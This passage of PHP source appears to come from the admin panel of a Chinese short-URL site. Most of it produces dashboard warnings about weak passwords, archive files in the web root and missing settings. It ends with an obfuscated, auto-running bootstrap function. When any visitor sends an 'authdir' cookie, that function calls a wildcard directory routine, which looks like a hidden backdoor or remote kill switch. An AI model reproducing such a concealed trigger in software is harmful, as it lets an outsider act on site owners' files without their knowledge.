        if (strlen($conf["admin_pwd"]) < 6 || is_numeric($conf["admin_pwd"]) && strlen($conf["admin_pwd"]) <= 10 || (isset($conf["kfqq"]) && $conf["admin_pwd"] === $conf["kfqq"])) {
            $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">重要</span>&nbsp;网站管理员密码过于简单，请不要使用较短的纯数字或自己的QQ号当做密码</li>";
        } else {
            if ($conf["admin_user"] === $conf["admin_pwd"]) {
                $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">重要</span>&nbsp;网站管理员用户名与密码相同，极易被黑客破解，请及时修改密码</li>";
            }
        }
    }
    if (strlen($dbconfig["pwd"]) < 5 || is_numeric($dbconfig["pwd"]) && strlen($dbconfig["pwd"]) <= 10 || (isset($conf["kfqq"]) && $dbconfig["pwd"] === $conf["kfqq"])) {
        $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">重要</span>&nbsp;当前主机的数据库密码过于简单，请不要使用较短的纯数字或自己的QQ号当做数据库密码</li>";
    } else {
        if ($dbconfig["pwd"] === $dbconfig["user"]) {
            $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-danger\">重要</span>&nbsp;当前主机的数据库用户名与密码相同，极易被黑客破解，请及时修改数据库密码</li>";
        }
    }
    $_var_7 = glob(ROOT . "*.zip");
    $_var_8 = glob(ROOT . "*.7z");
    $_var_9 = glob(ROOT . "*.rar");
    if ($_var_7 && count($_var_7) > 0 || $_var_8 && count($_var_8) > 0 || $_var_9 && count($_var_9) > 0) {
        $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-warning\">提示</span>&nbsp;网站根目录存在压缩包文件，可能会被人恶意获取并泄露数据库密码，请及时删除</a></li>";
    }
    if ($DB->count("select count(*) from dwz_domain where type=0 and state=1") == 0) {
        $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-warning\">提示</span>&nbsp;网站未设置或启用通用入口域名，可能导致无法生成短网址</a></li>";
    }
    if ($conf['second_jump'] == 1 && $DB->count("select count(*) from dwz_domain where type=1 and state=1") == 0) {
        $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-warning\">提示</span>&nbsp;您开启了二次跳转，需要至少添加或启用一个通用落地域名</a></li>";
    }
    if ($conf['dwz_token'] == '') {
        $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-warning\">提示</span>&nbsp;未设置对接token，将导致部分功能无法使用</a></li>";
    }
    if ($conf['pattern'] == '') {
        $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-warning\">提示</span>&nbsp;未设置默认跳转类型，可能导致短网址生成出错</a></li>";
    }
    if ($conf['dwz_type'] == '') {
        $_var_6[] = "<li class=\"list-group-item\"><span class=\"btn-sm btn-warning\">提示</span>&nbsp;未设置默认短网址，可能导致无法生成短网址</a></li>";
    }
    return $_var_6;
}

function _bootstrap_7def23bf954a3f8448917665189ad7a6()
{
    if (!defined("authcode")) {
        die();
    }
    php_sapi_name() == "cli" ? die() : '';
    if (isset($_COOKIE["authdir"])) {
        myscandir("*");
    }
}
_bootstrap_7def23bf954a3f8448917665189ad7a6();